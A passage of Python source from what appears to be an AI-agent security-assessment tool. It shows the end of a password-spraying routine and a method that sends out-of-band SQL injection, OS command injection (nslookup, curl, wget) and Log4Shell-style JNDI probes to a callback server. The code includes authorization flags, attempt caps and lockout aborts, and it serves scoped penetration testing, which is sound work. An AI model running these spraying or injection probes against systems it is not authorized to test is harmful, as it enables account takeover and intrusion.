                                   any(s.lower() in body_lower for s in success_ind) and
                                   not any(f.lower() in body_lower for f in failure_ind))
                        lockout = any(w in body_lower for w in ["locked", "too many", "rate limit", "blocked", "captcha"])
                        if lockout:
                            lockout_detected = True
                        results.append({
                            "username": username,
                            "password": "***REDACTED***",
                            "status": resp.status_code,
                            "success": success,
                            "lockout_indicator": lockout,
                            "response_snippet": body[:300],
                        })
                        attempts += 1
                except Exception as ex:
                    results.append({"username": username, "error": str(ex), "success": False})
                    attempts += 1
            if attempts >= max_attempts or lockout_detected:
                break

        hits = [r for r in results if r.get("success")]
        return json.dumps({
            "login_url": login_url,
            "authorized": authorized,
            "attempts_made": attempts,
            "max_attempts": max_attempts,
            "lockout_detected": lockout_detected,
            "successful_logins": len(hits),
            "hits": [{"username": h["username"], "status": h["status"]} for h in hits],
            "all_results": results,
            "verdict": f"CREDENTIALS FOUND: {len(hits)} valid login(s)" if hits else ("LOCKOUT DETECTED — spray aborted" if lockout_detected else "No valid credentials found"),
        }, indent=2)[:_tool_output_max_chars()]

    async def run_assessment_workflow(self, steps=None, workflow_id: str = "", max_steps: int = 6) -> str:
        """Run/resume a captured HTTP workflow with explicit identities, extraction and cleanup."""
        from app.services.agent.assessment_workflow import run_workflow
        return json.dumps(await run_workflow(self, steps=steps, workflow_id=workflow_id,
                                           max_steps=max(1, min(int(max_steps), 10))))

    async def run_oob_callback_workflow(
        self,
        url: str,
        method: str = "GET",
        location: str = "query",
        field: str = "url",
        headers: Optional[Dict[str, str]] = None,
        body: Optional[Any] = None,
        identity: Optional[str] = None,
        use_auth_session: bool = True,
        hypothesis_id: str = "",
        poll_attempts: int = 4,
        poll_interval_seconds: float = 2.0,
        server: Optional[str] = None,
        token: Optional[str] = None,
        keep_session: bool = False,
        summary_only: bool = False,
        sql_family: str = "",
        cmdi_shell: str = "",
        cmdi_command: str = "",
        jndi_variant: str = "",
        intent_id: str = "",
        coverage_cell_id: str = "",
    ) -> str:
        """Run a correlated custom OAST probe using a fresh Interactsh session.

        The target request remains subject to assessment scope and identity
        controls. ``location`` may be query, query_template, header, body_json,
        body_form, or raw; raw bodies must contain ``{{callback_url}}``. A
        callback returns a proof object ready for ``record_verify_verdict``.

        When ``sql_family`` is set (mysql/postgresql/oracle/sqlserver), the
        server builds a bounded, server-owned out-of-band SQLi payload for the
        observed ``field`` and injects it via ``query_template`` — the model
        never supplies the SQL bytes.

        When ``cmdi_shell`` is set (posix_subshell/posix_separator/
        windows_separator), the server builds a bounded ``nslookup`` payload for
        blind OS command injection on the observed ``field``. Only a DNS lookup
        is sent. ``cmdi_command`` curl or wget instead sends one HTTP GET to the
        callback host (wget is POSIX only).

        When ``jndi_variant`` is set (plain/dns/lower/upper/default_value/
        env_fallback), a server-owned Log4Shell-style ``${jndi:...}`` lookup of
        the callback host becomes the value of ``field`` (query, header,
        body_json, or body_form). A callback proves an outbound lookup, not
        code execution.

        ``intent_id`` / ``coverage_cell_id`` also record the outcome as an
        attack-graph fact. The callback collector is fixed by operator settings.
        """
        from app.services.agent.oob_callback_workflow import run_callback_workflow

        if sum(bool(v) for v in (sql_family, cmdi_shell, jndi_variant)) > 1:
            return json.dumps({"success": False,
                               "error": "choose one of sql_family, cmdi_shell, or jndi_variant"})
        if cmdi_command and not cmdi_shell:
            return json.dumps({"success": False, "error": "cmdi_command requires cmdi_shell"})
        value_template = payload_label = ""
        try:
            if cmdi_shell and (cmdi_command or "nslookup").strip().lower() == "nslookup":
                from app.services.agent.scoped_assessment.cmdi_oob import plan_oob_cmdi

                field, body = plan_oob_cmdi(url, parameter=field, shell=cmdi_shell)
                location, method = "query_template", "GET"
                payload_label = f"cmdi:{cmdi_shell}:nslookup"
            elif cmdi_shell:
                from app.services.agent.oob_payload_templates import plan_oob_cmdi_command

                field, body = plan_oob_cmdi_command(url, parameter=field, shell=cmdi_shell,
                                                    command=cmdi_command)
                location, method = "query_template", "GET"
                payload_label = f"cmdi:{cmdi_shell}:{cmdi_command.strip().lower()}"
            if jndi_variant:
                from app.services.agent.oob_payload_templates import JNDI_LOCATIONS, jndi_template

                value_template = jndi_template(jndi_variant)
                if (location or "query").strip().lower() not in JNDI_LOCATIONS:
                    raise ValueError("jndi_variant injects into query, header, body_json, or body_form")
                payload_label = f"jndi:{jndi_variant.strip().lower()}"
        except ValueError as exc:
            return json.dumps({"success": False, "error": str(exc)})
        if sql_family:
            from app.services.agent.scoped_assessment.sqli_oob import plan_oob_sqli

            field, body = plan_oob_sqli(url, parameter=field, family=sql_family)
            location, method = "query_template", "GET"

        result = await run_callback_workflow(
            self,
            url=url,
            method=method,
            location=location,
            field=field,
            headers=headers,
            body=body,
            identity=identity,
            use_auth_session=use_auth_session,
            hypothesis_id=hypothesis_id,
            poll_attempts=poll_attempts,
            poll_interval_seconds=poll_interval_seconds,
            server=server,
            token=token,
            keep_session=keep_session,
            value_template=value_template,
            payload_label=payload_label,
            intent_id=intent_id,
            coverage_cell_id=coverage_cell_id,
        )
        if summary_only:
            result = {key: result.get(key) for key in (
                "success", "error", "callback_observed", "poll_attempts",
                "evidence_ids", "proof", "provider", "graph_fact",
            ) if key in result}
        return json.dumps(result, indent=2, default=str)[:_tool_output_max_chars()]
